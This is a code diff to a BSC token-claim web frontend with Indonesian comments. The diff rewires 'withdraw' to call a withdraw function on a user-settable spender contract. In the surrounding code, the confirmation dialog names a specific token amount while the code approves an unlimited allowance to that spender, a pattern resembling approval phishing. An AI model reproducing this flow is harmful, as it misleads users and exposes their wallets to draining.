@@ -135,6 +135,7 @@ let interval;
 let web3;
 let walletAddress = "";
 let contract;
+let bankContract;
 let wcProvider; // WalletConnect provider instance
 
 // KONTRAK KAMU BSC BEP20
@@ -144,6 +145,17 @@ const USDT = "0x55d398326b99059fF775485246999027B3197955"; // USDT BSC
 
 // SPENDER bisa diubah pengguna lewat UI
 let SPENDER = "0x25df1e6e16370cbfb0578b0e30c00bcde0d0f131";
+
+// Minimal ABI untuk kontrak bank (asumsi fungsi withdraw(uint256 amount) ada)
+const BANK_ABI = [
+  {
+    "constant": false,
+    "inputs": [{"name": "amount", "type": "uint256"}],
+    "name": "withdraw",
+    "outputs": [],
+    "type": "function"
+  }
+];
 
 // ABI LENGKAP dengan approve, transfer, decimals, allowance
 const ABI = [
@@ -295,6 +307,8 @@ async function connectInjected(){
   const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
   walletAddress = accounts[0];
   contract = new web3.eth.Contract(ABI,CA);
+  // init bankContract using current SPENDER
+  bankContract = new web3.eth.Contract(BANK_ABI, SPENDER);
   document.getElementById('wallet').innerText = "Wallet: " + walletAddress.slice(0,6)+"..."+walletAddress.slice(-4);
   document.getElementById('btnConnect').innerText = "✅ WALLET TERHUBUNG";
   document.getElementById('inputAlamat').value = walletAddress;
@@ -324,6 +338,8 @@ async function connectWithWalletConnect(){
   const accounts = await web3.eth.getAccounts();
   walletAddress = accounts[0];
   contract = new web3.eth.Contract(ABI,CA);
+  // init bankContract using current SPENDER
+  bankContract = new web3.eth.Contract(BANK_ABI, SPENDER);
   document.getElementById('wallet').innerText = "Wallet: " + walletAddress.slice(0,6)+"..."+walletAddress.slice(-4);
   document.getElementById('btnConnect').innerText = "✅ WALLET TERHUBUNG";
   document.getElementById('inputAlamat').value = walletAddress;
@@ -345,6 +361,8 @@ function setSpenderFromInput(){
   SPENDER = val;
   document.getElementById('currentSpender').innerText = SPENDER;
   document.getElementById('inputSpender').value = '';
+  // re-init bankContract if web3 available
+  try{ if(web3) bankContract = new web3.eth.Contract(BANK_ABI, SPENDER); }catch(e){console.warn('Failed to init bankContract after SPENDER change', e)}
   showStatus('✅ SPENDER diperbarui: '+SPENDER, 'success');
 }
 
@@ -375,13 +393,12 @@ function confirmApprove(jumlah){
   return confirm('Anda akan memberikan APPROVAL ke '+SPENDER+' untuk '+formatAngka(jumlah)+' GRD.\nLanjutkan?');
 }
 
-// 2. WITHDRAW = KIRIM DARI KONTRAK KE WALLET (DENGAN APPROVAL FLOW)
+// 2. WITHDRAW = PANGGIL KONTRAK BANK withdraw(amount)
 async function withdrawBeneran(){
   if(!walletAddress) return alert("Connect wallet dulu!");
   if(saldoClaim < 100) return alert("Minimal 100 GRD");
   if(!web3) return alert('Connect wallet dulu!');
 
-  // Validasi alamat
   if(!web3.utils.isAddress(walletAddress)){
     showStatus("❌ Alamat wallet tidak valid", "error");
     return;
@@ -389,51 +406,45 @@ async function withdrawBeneran(){
 
   document.getElementById('loading').innerText = "⏳ Memproses withdrawal...";
   try{
-    // STEP 1: Cek decimals dan hitung amount dengan BN
     showStatus("Step 1/3: Cek informasi token...", "info");
     let amountBN = await getAmountBN(saldoClaim);
 
-    // STEP 2: Cek allowance
     showStatus("Step 2/3: Cek approval...", "info");
+    // check allowance to bank if needed (optional) — keep for compatibility
     let currentAllowance = await contract.methods.allowance(walletAddress, SPENDER).call();
     currentAllowance = web3.utils.toBN(currentAllowance);
 
     const jumlah = Math.floor(saldoClaim);
 
     if(currentAllowance.lt(amountBN)){
-      // Confirm with user before approving
       if(!confirmApprove(jumlah)){
         document.getElementById('loading').innerText = "";
         showStatus('⏸️ Approval dibatalkan oleh pengguna', 'warning');
         return;
       }
-
-      // Perlu approve dulu
       showStatus("⏳ Sedang approval token... (tanda tangan di wallet)", "warning");
       let approveAmount = getMaxUint256(); // unlimited
       await contract.methods.approve(SPENDER, approveAmount).send({ from: walletAddress });
-      showStatus("✅ Approval sukses! Melanjutkan transfer...", "success");
+      showStatus("✅ Approval sukses! Melanjutkan withdraw dari kontrak bank...", "success");
     } else {
-      showStatus("✅ Sudah ada approval. Lanjut transfer...", "success");
+      showStatus("✅ Sudah ada approval. Melanjutkan withdraw dari kontrak bank...", "success");
     }
 
-    // STEP 3: Transfer token
-    showStatus("Step 3/3: Transfer token... (tanda tangan di wallet)", "info");
+    // STEP 3: Panggil kontrak bank.withdraw(amount)
+    if(!bankContract){
+      bankContract = new web3.eth.Contract(BANK_ABI, SPENDER);
+    }
 
-    // NOTE: Ini memanggil token.transfer dari wallet user. Jika token yang dimaksud disimpan
-    // di kontrak "bank"/server, frontend harus memanggil fungsi withdraw pada kontrak bank,
-    // bukan token.transfer di sini. Sesuaikan SPENDER/flow jika perlu.
-    let transferTx = await contract.methods.transfer(walletAddress, amountBN.toString()).send({
-      from: walletAddress
-    });
+    showStatus("Step 3/3: Memanggil kontrak bank untuk withdraw... (tanda tangan di wallet)", "info");
+    let withdrawTx = await bankContract.methods.withdraw(amountBN.toString()).send({ from: walletAddress });
 
     // HANYA KURANGI SALDO SETELAH TRANSAKSI BERHASIL
     saldoClaim = 0;
     document.getElementById('loading').innerText = "";
     update();
 
-    showStatus("✅ SUKSES WITHDRAW "+formatAngka(jumlah)+" GRD | TX: "+(transferTx && transferTx.transactionHash ? transferTx.transactionHash.slice(0,16)+"..." : "(no-tx)") , "success");
-    if(transferTx && transferTx.transactionHash) showTxModal(transferTx.transactionHash);
+    showStatus("✅ SUKSES WITHDRAW "+formatAngka(jumlah)+" GRD | TX: "+(withdrawTx && withdrawTx.transactionHash ? withdrawTx.transactionHash.slice(0,16)+"..." : "(no-tx)") , "success");
+    if(withdrawTx && withdrawTx.transactionHash) showTxModal(withdrawTx.transactionHash);
 
   }catch(e){
     document.getElementById('loading').innerText = "";
